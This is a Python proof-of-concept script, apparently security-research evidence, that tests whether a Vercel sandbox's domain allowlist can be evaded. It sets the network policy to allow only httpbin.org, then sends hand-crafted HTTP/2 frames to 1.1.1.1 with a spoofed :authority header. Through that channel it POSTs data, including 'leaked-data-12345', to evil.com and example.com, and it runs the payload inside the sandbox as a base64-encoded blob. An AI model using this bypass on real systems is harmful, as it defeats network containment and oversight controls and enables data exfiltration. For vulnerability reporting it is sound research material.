# -*- coding: utf-8 -*-
"""h2 authority 混淆验证补测 (报告证据)
T1: h1 Host=example.com 对照 (预期 403 authority mismatch)
T2: h2 :authority=1.1.1.1 (公网 IP 任意值)
T3: h2 :authority=evil.com + POST body (数据转发确认)
T4: h2 :authority 重复头 (HPACK 重复 :authority)
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def run(tag, sc, maxlen=1500):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=90000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:maxlen]), flush=True)
    return out

api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

# T1: h1 Host 对照
run('T1-h1-host', 'curl -s -o /dev/null -w "H1_HOST_CODE:%{http_code}\\n" --http1.1 https://httpbin.org/anything -H "Host: example.com" 2>&1 | head -2')

H2_CODE = '''import socket, ssl, sys

def read_frame(s):
    hdr = b''
    while len(hdr) < 9:
        d = s.recv(9 - len(hdr))
        if not d: return None
        hdr += d
    ln = int.from_bytes(hdr[0:3], 'big')
    body = b''
    while len(body) < ln:
        d = s.recv(ln - len(body))
        if not d: return None
        body += d
    return hdr[3], hdr[4], hdr[5:9], body

def h2_req(authority, path='/anything', method='GET', body=b'', extra_headers=None):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        s = ctx.wrap_socket(socket.create_connection(('1.1.1.1', 443), timeout=6),
                            server_hostname='httpbin.org')
        s.sendall(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')
        s.sendall(b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00')
        # HPACK: :method (POST=3 literal), :authority, :path, :scheme
        blocks = []
        if method == 'GET':
            blocks.append(b'\\x82')
        else:
            blocks.append(bytes([0x40 | 3, len(method)]) + method.encode())
        blocks.append(bytes([0x40 | 1, len(authority)]) + authority.encode())
        blocks.append(bytes([0x40 | 4, len(path)]) + path.encode())
        blocks.append(b'\\x87')
        if extra_headers:
            for n, v in extra_headers:
                blocks.append(b'\\x00' + bytes([len(n)]) + n.encode() + bytes([len(v)]) + v.encode())
        h = b''.join(blocks)
        flags = 0x04 | (0x01 if not body else 0)
        frame = b'\\x00\\x00' + bytes([len(h)]) + b'\\x01' + bytes([flags]) + b'\\x00\\x00\\x00\\x01' + h
        s.sendall(frame)
        if body:
            df = b'\\x00\\x00' + bytes([len(body)]) + b'\\x00\\x01' + b'\\x00\\x00\\x00\\x01' + body
            s.sendall(df)
        data = b''
        s.settimeout(7)
        try:
            while len(data) < 700:
                f = read_frame(s)
                if not f: break
                if f[0] == 4 and not (f[1] & 1):
                    s.sendall(b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00\\x00')
                if f[0] == 0:
                    data += f[3]
                if f[0] == 7:
                    print('A=%s GOAWAY' % authority, flush=True)
                    break
        except Exception as e:
            pass
        print('A=%s BODY=%r' % (authority, data[:200]), flush=True)
        s.close()
    except Exception as e:
        print('A=%s ERR %s %s' % (authority, type(e).__name__, str(e)[:60]), flush=True)

h2_req('1.1.1.1')
h2_req('evil.com', method='POST', body=b'{"x":"y"}')
h2_req('example.com', path='/post', method='POST', body=b'leaked-data-12345')
h2_req('httpbin.org', path='/anything', extra_headers=[('x-duplicate', '1'), ('x-duplicate', '2')])
print('H2V_DONE')
'''

b64 = base64.b64encode(H2_CODE.encode()).decode()
run('T2-h2verify', 'echo %s | base64 -d | python3' % b64, maxlen=1700)

print('=== VERIFY DONE ===', flush=True)
